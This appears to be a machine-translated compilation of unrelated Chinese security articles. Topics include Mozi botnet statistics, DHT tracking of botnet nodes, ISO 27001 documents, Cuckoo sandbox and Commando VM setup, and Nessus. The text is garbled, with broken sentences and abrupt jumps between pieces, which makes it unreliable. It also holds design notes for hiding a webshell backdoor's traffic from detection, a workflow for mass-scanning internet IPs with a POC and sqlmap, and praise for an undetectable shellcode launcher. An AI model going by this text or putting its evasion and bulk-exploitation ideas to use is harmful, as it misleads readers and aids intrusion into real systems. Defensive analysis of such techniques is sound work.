Summing up the above means is not complex, operability is very strong, but can be good immunity to phishing mail, very expect in the future attack and defense drills against some more advanced attack techniques and skills, of course, some bosses quietly pointed out that "false end and false" or "false security", also right, no matter your company finally out, network security should be a normal operation, rather than inform you in advance time and place, but this is the beginning of all kinds of equipment vendors a gluttonous carnival.

Always do a good job of network security operation and maintenance is the top priority.

After all, the drill is just a drill, how to prevent real attacks to avoid hiding their ears and stealing bells is the practical work and responsibility of our security personnel.

Since September 2020, Zhiwei Micro Laboratory has continued to track Mozi botnets. Through the deep analysis of Mozi communication principles and DHT protocol, it has proposed a variety of active detection methods, using multiple detection means to conduct data cross-verification, and constantly touched the Mozi network boundaries.

We present our own statistical conclusions on the scale of Mozi's nodes, global and domestic regional distribution, and global activity at 24 hours, based on the collected detection data.

In view of the above questions, we are about to introduce a series of Mozi feature articles for a detailed introduction.

As a starter on the topic, this article will overview our current work on Mozi.

The huge number and rapid growth trend inevitably affect the huge interest chain and attracted a large number of criminals to seek huge profits. —— IBM found that the Internet of Things attacks between October 2019 and June 2020 increased by 400% from the previous two years.

The 2019360 report named the new P2P botnet Mozi, Green League, Know Chuangyu and other companies also subsequently released observations, and IBM pointed out that the M o z i botnet accounted for 90% of the I o T network traffic from October 2019 to June 2020, but they are still in the early observation stage, and the number of Mozi samples captured was far from enough.

360 The analysis was reported according to the Mozi transmission sample file name " Mozi.m”、“Mozi.Features such as a "named it" Mozi botnet ", whose pronunciation is easily reminiscent of the Chinese" ink ", so others called it the" ink " botnet.

According to the published analysis report, some security research teams in the industry suspected that the botnet was behind the Chinese people, and the speculated clues are as follows: the word "Mozi" was not found to have a practical meaning in the West;

As of April 25, we detected 1.35 million historical infection nodes, of which 730,000 were from China, or about 54%, (but in the IBM data released last year, the number of infection nodes accounted for 84%.

Whether IBM is not accurately counted, or whether infected nodes in other countries grew rapidly during the year is doubtful).

Figures 1 and 2 show that the top 10 infections in our statistics see the largest number of infected IoT devices in China, followed by India, Russia, which account for 92% of the total infections.

As of April 25, drawing depth from the data from our observations (we counted the location of i p where all infected Mozi nodes were located), we can see that Mozi, except in Africa, was more or less infected with backward Internet development, and once again shows that Mozi has swept the globe.

For the world distribution of stock Mozi nodes in China with the largest number of infections, we drew a heat map to more intuitively show the distribution of infected equipment in various provinces and cities in China.

By ranking the number of infections, we can see that the top ten provinces have the number of infections, especially in Henan, close to nearly 50% of the national total.

This attracts our attention, and a detailed analysis will be conducted for this problem later.

China stock Mozi node distribution heat map 8. Domestic top ten distribution because Mozi nodes are not fixed, but constantly new nodes, old node exit state, so we analyze the last 24 hours active Mozi sample, and map the world situation heat map and the distribution of domestic provinces, can find similar to the stock (all infected) Mozi distribution, this shows that Mozi in the global synchronous expansion, great threat.

From the world, the Internet of Things equipment infected by Mozi is mainly distributed in Asia and Europe, while the domestic infected Internet of Things equipment is mainly distributed in the economically developed eastern and southern coastal areas.

According to the G D P ranking in 2020, the top 10 provinces and cities, including Guangdong, Jiangsu, Shandong, Zhejiang, Henan, Sichuan, Fujian, Hubei, Hunan, Shanghai and other cities, are surprisingly similar to the Mozi infection ranking.

Relevant data show that Guangdong province has the most demand for 5G base stations, followed by Jiangsu and Shandong.

At the same time, in the analysis of the regional distribution of the exposed Internet of Things assets in the annual report of the Internet of Things security released by the Green League in 2019, Henan, Shandong and Jiangsu ranked the top three mainland regions, which also have certain reference value.

It is inferred that the more economically developed areas and rapid Internet development, the more Internet of Things equipment, so that criminals can take advantage of the virtual.

Sample statistics Our captured Mips architecture accounted in the highest M i z i samples, followed by the lowest Mipsel,Arm6/Arm7, proportion was Arm4/Arm5.

Figure 12 shows the top 10 ip of the types of downloaded samples and its number of downloads.

A series of articles will follow a detailed analysis of the samples.

Why are 130,000 new Mozi nodes detected in just 20 days?How was it detect?Knowledge microlab has used various methods to actively probe Mozi nodes, and now share our first interesting approach.

This paper first introduces the underlying principle of Mozi parasitic P2P network, Mozi partner handshake mechanism and node aggregation phenomenon, and then introduces the original core technology of this laboratory "a progressive node active tracking device for the new P2P botnet Mozi" (high play can be directly moved in section 2), and finally analyzes the advantages and disadvantages of this method.

Zhiwei Laboratory is committed to the security research of the Internet of Things, and hopes to communicate and cooperate with your security peers to help the security of the Internet of Things.

Different from the traditional botnet communication method, Mozi uses P2P communication and control, node authentication, communication process and communication content encryption, these measures improve the botnet concealment and stubborn degree, greatly increase the difficulty of botnet tracking and cleaning, urgently need a new type for P2P botnet tracking method.

Since Mozi is parasite in normal P2P networks, it is a reasonable direction to find new methods of network tracking from the association analysis combining the underlying principles of the P2P network with the Mozi properties.

The Kademlia Agreement is the PetarP. of New York University, United StatesMaymounkov and David Mazieres.The results of a study published in 2002, The Kademlia: A peerto-peer information system based on the XOR metric》.

Briefly, Kad is a distributed hash table (DHT) technology that establishes a brand new D H T topology based on a unique heterologous algorithm (XOR), which greatly improves the route query speed.

In May 2005, after the famous BiTtorrent implemented the D H T technology based on the Kademlia protocol in version 4.1.0, soon the domestic BitComet and BitSpirit also realized the DHT technology compatible with BitTorrent, realizing the trackerless download method.

Kad has now become the mainstream implementation of DHT, and the Mozi parasitic P2P network is also based on the Kad implementation.

The Kademlia algorithm is a distributed hash storage and routing algorithm, which are partially stored at each node of the P 2 P network based on the Kad protocol.

At this point, the following questions need to be considered: a.How to allocate the storage content to each node b.How to find the node / address / path that stores the file? How to route the target nodes quickly and efficiently is an important problem solved by Kad.

Data key values (K e y), node ID (N o d e I D) in the Kademlia networks are all represented by 160 b i t, and NodeID was randomly assigned when joining the network.

The Kad protocol states that each node maintains the following 2 information: a.Resources that need to be stored, stored as <key,value> pairs, and can be understood as the hash of the file name and the file content b.A routing table, Call it the "k-bucket"," Tiered by Node ID, The ID, IP addresses, ports of a limited number of other nodes are in the Kad network, The distance Dinstance between the two nodes is not measured by the physical distance, the number of router jumps, Relying instead on the difference or distance of the node ID, That is, the ID of the two nodes is assumed to be A, B, respectively, The distance between A and B, for example: A = 110, B = 111, Then another way to understand the one described above: if you comb the nodes of the entire network into a binary tree by node ID, Each leaf at the very end of the tree is a node.

The location of each node is determined uniquely by the shortest prefix of its ID value.

The process of forming a Kad network node tree of nodes is as follows: Step1: first represents key (such as node ID) in binary form, and then presses S t e p 2 to S t e p 3 from high to low.

The n th bit of the Step2: binary corresponds to the n th layer of the binary tree.

Step3: If the current bit is 1, enter the right subtree, and if 0, enter the left subtree (considered set, in reverse).

After the Step4: is treated from high to low, this Key value corresponds to a certain leaf node on the binary tree.

When we operate all nodes ID following the above steps, these nodes form a binary tree, as shown in Figure 1: Figure 1. The node in any kad network encoding the leaf node is a full-path leaf node of the above node tree.

The height of the node tree is equal to the b i t length of the P 2 P node I D as specified by Kad.

1.2.2 node tree split Each node can split the binary tree from its own perspective, breaking the binary tree into a series of continuous ones that do not contain its own subtrees.

The subtree of the highest layer consists of the entire tree that does not contain the other half of its own tree; the next subtree consists of the rest without its own half; and so on until the entire tree is divided.

The split rule is to start from the root node, split the subtree that does not contain itself, and then split the next subtree of the remaining subtree, and so on, until only yourself.

As shown in the figure above, splitting from a node ID of 6 (110) yields 3 subtrees (gray circles).

Taking node 101 as a perspective, the binary tree of Figure 2: Figure 2. Kad is m=160 (hash value 160bit), so there are up to 160 subtrees after splitting.

Considering that the number of nodes in the actual network is far from 2 ^ and 160, the number of subtrees is significantly less than 160.

Suppose that each node ID is a N bits.

After each node divides the sub-tree according to its own perspective, it can get a total of N subtree.

If one node in the N subtree is known separately, then the current node can use the N nodes to recursively route to any subtree and nodes of the entire binary tree.

Moreover, the cost of maintaining these N nodes depends on the tree height.

The Kademlia default 160 tree height is not relatively expensive for maintenance.

In the actual use process, considering the robustness (each node may exit or go down) problem, to know that only one node is not enough, you need a few more nodes to be insured.

Therefore, Kad paper proposes the concept of K-barrel (K-bucket): after each node completes the molecular tree, to record K nodes in each subtree.

Here K is a system-level constant, set by the software system itself.

The K bucket is actually the routing table here.

After each node divides the subtree according to its own perspective, it can get the N subtree, then you need to maintain the N routing tables.

The concept of K-barrel is used in the Kad algorithm to store the state information of other neighboring nodes, which consists of data lists.

Each such list is called a K bucket, and the internal information storage location of each K bucket is arranged in chronological order from the last sight, recently seen on the head, and finally on the tail, and each bucket has no more than K, as shown in Figures 3 and 4.

Figure 3. K barrel schematic diagram Figure 4. K barrel link diagram increases exponentially because of the range of coverage distance of each K barrel, this forms more information for nodes close to yourself and fewer information away from yourself, which can ensure that the routing query process is converged.

Because the interval is divided exponentially, it is proved that for a K a d network with N nodes, it can only need to go through the logN step query to accurately locate to the target node.

The Kademlia protocol consists of four remote RPC operations: PING, STORE, FIND_NODE, FIND_VALUE.

The role of PING operations is to detect a node to determine whether it is still online; b.The action of STORE operations is to notify a node to store a <key,value> pair so that a later query needs; c.The FIND_NODE operation uses a 160 bit ID as a parameter.

The recipient of this operation returns information that it knows about the K nodes closer to the target ID.

Information on these nodes can be obtained from a single K barrel or from multiple K barrels.

In either case, the recipient returns the information of the K nodes to the operation initiator.

However, if the recipient all K bucket plus also has no K node information, then it returns the information of all nodes to the initiator.

The FIND_VALUE operation is similar to the FIND_NODE operation, except that it only needs to return the (IP address,UDP port,Node ID) information for one node.

If the recipient of this operation receives a S T O R E operation for the same key, the stored value value is returned directly.

To prevent fake addresses, in all RPC operations, the recipient needs to respond to a random I D value of 160 bit.

The PING operation can also be included with the recipient's RPC response message for confirming the recipient's network address.

One of the biggest features of Kad technology is the ability to provide a fast node finding mechanism, and it can also adjust the search speed through parameters.


If there is fewer information in this K bucket, the total nodes closest to D are selected from multiple nearby buckets.

For each node that receives the query operation, answer as Y if it is closest to Y; otherwise measure the distance from Y and select the information of a node from your corresponding K bucket to X.

X performs the FIND_NODE operation again for each newly received node, and the process is repeated until each branch has a node in response to itself being closest to Y.

With the above lookup operation, X gets the K node information closest to Y.

Here is the term "closest", because node Y does not necessarily exist in the network, that is, that Y is not assigned to any computer.

When we studied the Mozi sample, we found two prefixes for the Mozi node ID: a.Sample file hard coded 888888 (0x383838383838) b.The prefix specified by the h p instruction in the config configuration file, the property of the hardcoded prefix of 888888888 (0x3838383838383838) Mozi node ID, is equivalent that Mozi nodes cluster under certain subtrees of the P2P network.

The goal of tracking a specific subtree is to get as many nodes under these subtrees as possible, and then confirm the Mozi nodes.

Compared to the aimlessly conducted Mozi confirmation method of random nodes, this "cane" active detection method can quickly find out the "ink" lurking under the kad binary tree, greatly improving the tracking efficiency.

The first problem to be solved now is how to get as many nodes under a particular subtree as possible.

At this point, the characteristics of the K a d protocol that we mentioned in section 2.2.6 are used: the node returns the closest node to the destination node in its own routing table in response to a find_node request.

If we take a normal P2P node as a relay routing node and send it a find_node request targeting the random node under a particular subtree, the normal P2P node returns the node in the routing table closest to the random node of a particular subtree.

This node may exist directly in a particular subtree, which is relatively closer to it, even without a particular subtree.

If the returned node is not in a particular subtree, we will use this node as the relay routing node, and continue to obtain the routing table data, so recycled.

By detecting specific routing table data for normal P2P nodes, we can collect a large number of nodes under specific subtrees.

At this time, E sends a find_node request to D, and the target node is a random node A in a specific subtree. The formula is as follows: According to our previous analysis of dismantling molecular trees, A, B and C nodes may appear in the same k barrel of D, that is, due to the limitation of K barrel length, A, B, C may or may not appear.
The probability that a node exists in the routing table is positively associated with the difference or distance of the node.

Even if E receives only the C nodes that are not in a particular subtree, the probability of recording specific subtree nodes in C is higher due to D (C, B) <D (E, B), and the process of obtaining specific subtree nodes is gradually converging.

Since the process of obtaining a specific subtree node converges, the probe node will surely acquire the specific subtree after several iterations.

This convergence process, input as (normal relay routing P2P nodes, random ID under specific subtrees), the executor is the probe node, and the output as nodes under specific subtrees recorded in the relay routing node K barrel.

Note that we utilize K-bucket data from relay routing nodes rather of real specific subtree nodes, so we only need to construct a random specific subtree node ID.

To sum up, the core idea of this technology is: to construct the random node I D under a specific subtree by imitating the P2P route address, and to search for the records of the specific P2P nodes in the routing table of normal P2P nodes.

Then the last question we need to solve is how to collect enough relay routing nodes.

The simplest way we can think of is to communicate with some publicly available P2P nodes, get a large number of normal nodes from the response of the public node and cycle iteratively.

To speed up tracking, we design a relay routing pyramid storage model for classifying relay routing nodes based on the top 8 b i t of nodes ID to quickly locate relay routing nodes close to a particular subtree.

Can uniquely mark a P2P node.

We take the first 8 b i t of the relay routing node NodeID as computational units against the first 8 bit of a specific subtree prefix, and the different or values determine the location of the relay routing node in the pyramid storage model.

After the pyramid storage model is built, the high-level nodes in the pyramid are preferentially selected as the relay routing nodes for detection each time it is tracked.

At the same time, if the number of high-level nodes is insufficient, the low-level nodes need to be selected to supplement the high-level nodes.

In actual use, the initialization node can select the P2P public nodes listed above, put the public nodes first into the pyramid storage model, and then expand the ongoing data update work of the specific subtree detection and the pyramid storage data model.

In engineering practice, we choose MongoDB to store the pyramid storage model data.

The data structure is as follows: Use the Redis to cache the nodes that need to be stored, and write the background Worker consumption Redis data input Mongo, to complete the data storage.

When relay routing nodes are needed, obtain nodes from MongoDB via API by a certain scheduling algorithm.
As shown in FIG. G. 10, the pyramid data model and the active tracking device form a data closed loop, and the pyramid data model continuously collects the reported data of the tracking device, and also provides a data source for the external scattered tracking device.

The low-level node pull module obtains relay routing nodes farther from a specific subtree by accessing the pyramid data interface.

Such nodes entered into the relay node output a higher level relay routing node closer to a particular subtree.

Therefore, the significance of the low-level node pull module is to continuously input the higher-level relay routing nodes into the pyramid data model to transfusion the high-level node pull module.

Several specific node tracking devices can be deployed in the network, and multiplexed parallel tracking devices can greatly improve the efficiency of tracking.

One-hour statistics divide levels 1 to 8 according to the pyramid storage model in section 2.3, we counted the active data within one hour and sampled 100,000 relay nodes for detection, and drew Figure 11 based on the number of Mozi nodes present in them.

The number of Mozi nodes also increases by ladder with the hierarchy.

One-hour sampling data statistics can show that the progressive node active tracking device can quickly and efficiently mine special nodes lurking in a normal P2P network, with nearly 100% accuracy.

Moreover, the device can play a very useful role for similar problems of mining specific nodes in the P2P network.

The method focuses directly on the mining of nodes under specific subtrees, with fast convergence and mining to a large number of surviving nodes in a short time.

Meanwhile, the method can be used for mining problems with specific nodes under specific subtrees similar to the Mozi property.

This is also the maximum theoretical value of the method.

The P2P features relied on by this method will not change greatly for the moment, while the dependent Mozi features may change, such as the prefix. of NodeID

The method cannot actively perceive changes in the actual Mozi node ID prefix and can only be specified manually.

Therefore, to compensate for this shortcoming, we need to use our alternative proposed method to perceive the sample prefix, in real time as the ID prefix input to this method.

The two methods coexist and support each other.

The user logs in, that is, as long as there is a login operation will be executed, log out and then log in, and will also execute this key value.

Charlotte is a Shellcode initiator based on the C + + implementation and is not detected by security solutions at all.

In building the ISO 27001, the most time-consuming and energetic stage is the establishment of institutional documents and the implementation of the requirements.

The establishment of the system documents limits the process specification of the ISO 27001, and the implementation is to implement the requirements of the system documents to ensure the stable operation of the system.

Working for many years, the honor to build a ISO 27001, from 0 the whole process has a lot of income.

The first kind of demand is better to achieve, you can find a consulting service provider, service outsourcing, the enterprise only need to do a good job in project management and acceptance can be.

The second demand is relatively difficult, and it is necessary to consider the rationality, feasibility and the balance with the business efficiency of the system documents combined with the actual business of the enterprise.

This film explores how to plan the institutional document in the second need.

The revision of the system documents is carried around the certification scope, for example, your certification scope does not include the outsourcing business, then the system documents do not need to plan the outsourcing management part.

In planning the system document, the first thing to develop and output is the Statement of Application, which describes the objectives / controls of the enterprise, the reasons for selecting them, the current controls, and the relevant documents involved in the GB/T 22080-2016 /ISO/IEC 27001:2013 Appendix A.

In other words, the applicability statement is to sort out the requirements of the A5-A18 in the system, one by one, which one applies to the enterprise, and what documents need to be output if applicable.

Basically, once the applicability statement comes, there are several whole ISO 27001 system documents, each corresponding content comes out, which completes most of the system document strategy.

The above table is basically the main content of the applicability statement, according to this table can determine the system file directory and files need to be covered content.

After sorting out, the necessary ISO 27001 system documents are as follows: In the process of formulating the system documents, there are often unconscious or unexpected problems. These problems are mainly reflected in the following aspects: 1. The target cannot be assessed.

In the management manual or other documents, the established safety objectives or standard requirements cannot be assessed.

Such as major information security leakage is not more than 0, but the whole system documents lack of the definition of major information security leakage, what is called major information security leakage, two employees' mailbox information leakage, whether the executives of personal privacy information disclosure, the result leads to the information security target cannot be assessed and measured.

There is also a situation, such as the annual information security training assessment pass rate is 98%, but the assessment data of the training system is only retained for 30 days, when the statistics at the end of the year, found that the data in December is found, resulting in the target can not be counted.

In the computer control program, after 10:00 PM, the computer must be shut down and use the terminal management software.

However, the equipment of some test departments can not be shut-off at night, and they must run to test the performance every night. This regulation affects the work of the test department, and then affect the business, so it is unreasonable.

The actual situation of the business department should be investigated, and the regional control or business control should be carried out according to the actual needs.

After the release of the system documents, the control requirements of the system were clarified, but they were not implemented in accordance with the requirements.

If the computer control program stipulates to ban the U port, but not, the employee can copy any file.

Required for 3 months to change the password, and actually did not execute, the employee's password is never modified, etc.

If the information security event control program stipulates, the information security events should be reported in time.

This content is very vague, 1 hour is not in time, 2 hours, 12 hours?For another example, the business continuity control procedure stipulates that the business will be interrupted for 4 hours and must be reported to the general manager.

This content is also unclear, all business interruption for 4 hours to be reported?Do some non-core systems, such as the machine room entering the registration system, interrupted to 4 hours be reported to the general manager?In fact, the entry of the machine room into the registration system for 4 hours, which will not affect the business. We only need to register manually, and there is no need to report to the general manager level.

ISO 27001 is a relatively complex and difficult system to implement.

The difficulty is mainly reflected in the sustained resource investment and the balance of business efficiency.

System documents are the core of the whole system, and the program and guidance. Planning the system documents in the early stage can avoid most of the problems that will occur in the operation process of the system and make the operation of the system more stable.

The so-called sandbox (sandbox) is a security mechanism that separates unknown and untrusted software, which is generally used to automatically dynamically execute untrusted software in an isolated environment, and then extract the process behavior, network behavior, file behavior and other dynamic behavior, etc. Security researchers can conduct a more thorough analysis of malware according to the results of these behavior analysis.

Cuckoo is an open source automated malware analysis system written in Python. Its main functions are: (1) tracking all call status of malware; (2) malware file behavior: behavior of creating new files, modifying files, deleting files, read files or download files during malware execution; (3) obtaining memory mirror of malware; (4) recording network traffic of malware in PCAP format; (5) obtaining screenshots of malware execution; (6) obtaining complete memory mirror of the client performing malware.

The directory corresponding to the CWD contains configuration components, generated data, detection results of cuckoo, etc.

Suppose that the CWD default ~ / is created in this directory.cuckoo If you run cuckoo, as user1, you do not have to specify a CWD, using / home/user1/. by defaultcuckoo/。

So why need the concept of CWD?The reason is that we can run multiple cuckoo instances at the same time, using different configurations on the same host, by specifying a different CWD.

For example, to do both windows and Android analysis, you can specify a different CWD, so you do not have to modify the configuration repeatedly.

The profile cuckoo. that is mainly used by cuckooThe conf: the main profile, the main is that machinery, is used to specify the virtual machine profile we use, the default is virtualbox.

The file is also located under the conf directory with the name virtualbox.conf 。

Another more important configuration item is [resultserver]'s ip and port, used to specify the server receiving the results of the analysis.

The address must be able to let the virtual machine access, which is generally set to the address of the virtual network card, such as the I P address 192.168.56.1 of the Host-only virtual network card vboxnet0, only by default.

In the actual configuration, one of them can be configured according to the virtualization environment you use, and the same profile used must also be in cuckoo.The machinery field for the conf specifies.

The configuration options here are all for specific virtualization platforms, with many options available only for certain platforms.

Previously we used the virtualbox.The conf, where mode specifies the running mode of virtualbox, path specifies the absolute path of VBoxManage, machines specifies the name of the virtual machine we use (multiple virtual machines need to be separated by half angular comma), platform specifies the system type of the virtual client, ip specifies the ip address of the virtual machine; reporting.The conf: reports the profile of the generation module to open jsondump or HTML Report, can also configure MongoDB storage analysis results (Web console).

We can do the test by default.

Configure the auxiliary.The confauxiliary modules are scripts for ongoing malicious sample analysis, and this profile defines their options.

Why allow virtual machines to access the Internet In order that malware does not negatively affect the work environment, and that virtual machines are accessible by analysts, should make the virtual machine work in host-only mode.

However, this network mode cannot meet the requirements of normal automated malware analysis, because virtual machines in Host-only mode cannot access the Internet, and many malware will need access to the network to work properly.

So the vboxnet0 this network card has the function of agent Internet access, so that the virtual machines in the host-only network can access the Internet through this virtual network card.

If you want to meet this requirement, two operations need to be done on the Ubuntu Host machine: open traffic forwarding, and use iptables for address conversion (NAT) rules.

Once configured, virtual machines can access the Internet through vboxnet0.

Install the 64-bit windows 7. in a virtual machine

Fixed I P address is set in the virtual machine 3, Verify that Network Access Due to the I P forwarding and address conversion configured in host, the Internet can be accessed in the virtual machine.

Software installation in virtual machine 1. Install python and third party library Download install version 2.7 python.

Installation may need to write the path to the python executable manually to the PATH environment variable.

If the python 2.7 is installed on the system disk, use the following method to add the executable path to the PATH: System Properties-Advanced-Environment Variables, select the path variable, and click the Edit button.

Deploying operations on the cuckoo agent cd $CWD/agent //host to see the files in the agent directory will agent.The py file is copied to the system boot up directory of the Win7 virtual machine so that the program starts with no GUI window.

Restart to test automatically: pythonw. exists in the process listThe e x e, says the agent is running.

enable administrator Account An account was created when the windows 7 system is installed and the administrator account is disabled.

The highest permission account should be used when the sandbox works to avoid the application due to insufficient permission.

Turn off windows feature (1) Disable windows Automatic Update (2) Turn off windows Firewall (3) Turn off UAC3 and set user automatic login to control userpasswords2.

Each time the client analyzes a malicious sample, the virtual machine is restored to the state of this snapshot.

One thing to note when saving system snapshots: make sure the system works properly and agent.When the pyw runs without an interface, execute a system snapshot.

Submit a URL to submit a U R L to the cuckoo by command line or web page. If reasonable results are obtained, the cuckoo is running properly.

So far, the windows 7 system is configured as a virtual machine for cuckoo.

Set Fixed IP address (1) Configuring IP address vi /etc/network/interfaces, restart the network service Note that the IP address does not conflict with other virtual machines (the previous windows virtual machine configuration is 192.168.56.101).

Configure the dns server vi /etc/resolv.conf, joins dns server address 3. Verify Network Access I P access to the Internet within virtual machines due to configured forwarding and address conversion in host.

Restart the system, verify: you can see, after the restart of the agent agent.The py has started running automatically.

Close virtual machine firewall ufw disable3, close virtual machine NTP service timedatectl set-ntp off(4) Take a virtual machine snapshot next need to establish a snapshot of the configured client.

Each time the client analyzes a malicious sample, the virtual machine is restored to the state of this snapshot.

One thing to note when saving the system snapshot: make sure that the system snapshot is executed when the system is running properly.

Submit a URL to submit an executable to cuckoo via command line or web page, if reasonable results, cuckoo is properly.

By web page, cuckoo automatically determines the file type and gives it to the corresponding virtual machine for execution.

For example, submit a homemade linux program, called linux.The e l f, will see the linux sandbox being started: this shows that the submission is successful, so is the analysis possible?Browser browser visits the following website: http://127.0.0.1:8000/analysis/ View cuckoo analysis results: you can see the detection results, indicating that cuckoo's main program and virtual machine work correctly.

So far, the ubuntu 1804 system is configured as a virtual machine for cuckoo.

The so-called analysis package is about the type of samples and the parameters passed to the samples, and the concept of the analysis package will be detailed later.

The current time is used without assigning the clock.

This is a mandatory option that must be used.

Specify the analysis package as dll and set two options: the function in the dll being executed named FunctionName, 2 is using explorer.The e x e acts as a dll initiator.

Access cuckoo web interface via web interface: http://127.0.0.1:8000/ click "SUBMIT A FILE FOR ANALYSIS", upload file for analysis.

Click "SUBMIT URLS/HASHES", to submit a URL or file hash for analysis.

View the analysis results Click on the Recent, above to see the malicious samples of the recent analysis.

Click on the sample name to see the analysis results: In the Signatures(behavior characteristics) section, you can see the sample performing adding users to the administrator group.

cuckoo took screenshots of sample execution in a sandbox, which further understand the operation of the sample.

Increase the encryption method of the RSA principle

The RSA mechanism is manually implemented using mathematical formulas to reduce dependence to avoid environmental constraints
RSA combines full encryption of AES dynamic key transmission traffic, capture full amount of data package + capture samples + obtain client code cannot decrypt and restore, increasing the difficulty and cost of the detection stage and traceability analysis stage of the attacked party

Request data to randomly generate parameter names and random length split parameter values

The response content randomly falsified html tags and inserts interference characters

payload storage in application to reduce repeated upload ideas to comb why the backdoor connection should have a password?

As a way of authentication, in order to control the scope of use, only you can make use of themselves, for the program, by identifying whether to master a secret data to distinguish why the identity of Godzilla put the key into the shell?

Before ice scorpion using fixed password as an authentication means, back door generate dynamic key back to the client, then use AES encryption traffic, the disadvantage is that the middle traffic is encrypted, but the key in the connection stage in explicit form of the traffic, has obvious features, security equipment can be identified after the ice scorpion, accurately extract key decrypt subsequent traffic.

And built-in into the file, save the middle clear text data transmission link, the pure traffic device cannot decrypt the fixed key what disadvantages?

From a traffic point of view, the same request data encrypted with the same AES key has the same secret text (no iv), with a limited character content range and a regular length.

From the perspective of terminal analysis, the key of this section of data has nowhere to hide. Written in the back door file, the traffic device linkage EDR or manual way can still decrypt the detailed back door. What is the difference between the back door and the normal page?

In terms of access behavior, there is less source IP and a single source. Compared with the historical record, it is a new URL. In data transmission, the request parameters are relatively fixed, the content is not readable, and the DOM structure is very different between the response page and the normal page. Why do most backdoors need to set parameter names?

The essence of the request is to exchange data, determine the parameter name can be accurate and convenient transfer or obtain data with specific meaning, parameter name can be regarded as the coordinates of data in http data structure, parameter name solves the data exchange process, does not affect the data itself, as long as both parties pass and the acquisition way agreement, the parameter name can be converted into other forms of optimization scheme.

Using rsa way of encryption, using two keys to complete encryption and decryption, get only one public key cannot be decrypted

The rsa encryption length is limited, referring to the netease Cloud web login scheme, the AES key is dynamically generated, exchanging the rsa for the aes key for the first time, and subsequently switching to the aes

The request parameters were randomized, the request content turned to hex values, dispersed into multiple random parameters with interference characters inserted in the middle

The response content is randomized, inserting interference characters, randomly adding html tags to implement the code rsa principle encryption and decryption can use different rules, as long as there is some correspondence between the two rules, so that the direct passing of the key is avoided.

This new encryption pattern is known as the "asymmetric encryption algorithm".

The toolset is called "CommandoVM".

Security workers often configure their own virtual machines when penetration testing the system environment, fine if it is Linux, and Kali Linux.

But the Windows environment is miserable, and it often takes hours to configure the virtual machine environment.

It takes you very much time to maintain a custom virtual machine environment and often upgrade your integrated tool suite.

Whether the environment can be well configured and how quickly it is matched has become a standard to measure the skills of penetration test engineers.

Many of them integrate the tools in Commando in their own environment, but they don't have a standard toolset when you test Windows.

One is to integrate the best penetration test tools without spending a lot of time searching.

The second is that Kali Linux released in 2013 inherited more than 600 security, forensics, discovery and exploration tools, in which Commando selected the best tools for Windows, many of which are originally supported by Windows.

The second problem facing penetration testers is the maintenance of the toolset.

Commando VM packs all the tools into one distribution to accelerate maintenance, patching and updating even easier.

Commando VM, the Commando VM suite is built for Windows platform, belongs to a new iteration version of FLARE VM suite, which specializes in reverse engineering and malware analysis. Commando VM function is more comprehensive and is the first choice platform for internal penetration testing in Windows environment.

The virtual machine environment built based on the Windows platform has the following obvious advantages: 1, native support Windows and Active Directory; 2, can be used as a temporary workspace for the C2 framework; 3, more convenient sharing and interactive operation support;

Support tools such as PowerView and BloodHound; 5. Have no impact on the test objectives.

The Windows 10 mirror works to support more functionality.

After the system installation, it is recommended to add supporting virtual machine tools (such as VMware Tools) to support other settings, such as copy / paste and screen display adjustment.

After the virtual machine environment is successfully configured, all of the following steps operate in that environment.

Run Windows Update to ensure that the system is updated to the latest version.

It is recommended that you restart the system to check again after the update is completed.

Make sure the system builds a snapshot for the latest version, saving the time to install the system in case you need to reconfigure.

Download the Commando VM file on the GitHub and extract it.

Locate the decompression folder directory and open the PowerShell session using administrator privileges (installing Commando VM requires system settings to be modified).

Type the following command to change the PowerShell's execution policy to unrestricted and answer "Y":Set-ExecutionPolicy unrestricted6, execution install. at the PowerShell promptThe ps1 installation script.

The current user is prompted for the current password.

The Commando VM requires the current user's password to automatically log in after the restart.

You can specify the current user through the command line "-password".

The rest of the installation process needs to be networked and executed automatically, and may take 2 to 3 hours to complete depending on the network speed.

The virtual machine system is restarted multiple times during this period.

After the installation, PowerShell remains open and type any key to exit. After the desktop is as follows: 8. restart the system again to ensure that all configurations take effect.

Build the snapshot again after the restart for the contingency.

The POC of this vulnerability is very simple, directly attached here, details need there are many online.

POC: Information Collection It is well known that information collection is the most critical link in penetration testing.

In the stage of information collection stage, our main goal is: 1, find the online vulnerability POC2, find out the IP list that may exist. Here I recommend 2 vulnerability libraries that I often visit first.

The subsequent P O C of the PeiQi WiKi-POC library article also refers to the information in the library.

The text begins this time with the Fofa search engine to collect a possible vulnerability in the IP.

Fofa statement: Considering the subsequent need to export the I P list collected by Fofa to the script batch validation, it is easy to use the Github open source tool Fofa-collect. Just configure your Fofa mailbox and API, you can just enter the Fofa syntax, and get the query results.

My use process is as follows: 1. Enter Fofa syntax in Fofa-collect-> get IP:PORT list 2, export and save as IP.By txt at this point, the information collection process ends.

POC Batch Validation POC Batch Verification stage Our main goal is: to write or use POC, find out the original IP P O C link in the IP list can see a flawed URL in the running results, and has been deposited in urls.At t x t we pick a URL and run with sqlmap to see that there is an injection point.

Actually the article here, can prove the vulnerability exists, but according to my vulnerability box brush public SRC experience, SRC vulnerability need clearly belong to unit, only ip or non-clear unit of domain name is not included, so light IP is not enough, we need to put these loopholes of IP, through IP check domain name, find out the domain name, and find out the domain name unit, so that can be a vulnerability can be submitted.

Batch IP domain name check at this stage our main goal is: known urls.There is a vulnerability in the I P in txt, find out the domain names corresponding to these IP, and find the unit where the domain name want to batch IP backcheck the domain name, to find a suitable interface is the first problem to consider.

You can see that through a Fofa statement and a POC, we can quickly find a vulnerability that can submit the public welfare SRC in a short time. When we get a new POC, you can only replace the POC_1() function and change the code slightly to realize the batch mining of another vulnerability.

Summary regret the POC used in this article is my P O C provided by PeiQi library, so it is not original, but this is also a process of learning, look more at others, slowly I can write, which also marks that I am from a script boy into a code master (joke).

Why not use the existing POC batch tools?I have learned that POC-T is a great POC batch validation tool and g o s o n format in goby, which are very efficient and convenient.

But I think I learn a long time, to try to learn from the basic, which needs to write code, understand the logic at the bottom of those tools.

Maybe in the eyes of some big guys, my small project is a suture monster, but I think this is a record of my learning, and I hope to love.

I will be using Kali Linux as the attacker machine for this learning.

The techniques used here are used only for learning and educational purposes, and the station and the authors are not responsible if the techniques listed are used for any other objective.

In total, over 75,000 institutions used Nessus as software to scan the agency's computer system.

Nessus is so leading in application vulnerability evaluation, and with such a powerful and easy-to-use remote security scanner, it is not only free but extremely updated.

The function of the security scanner is to make a security check on the specified network to find out whether there are security vulnerabilities in the network. The free version only supports 0 to 16 IP scans, which will not be used.

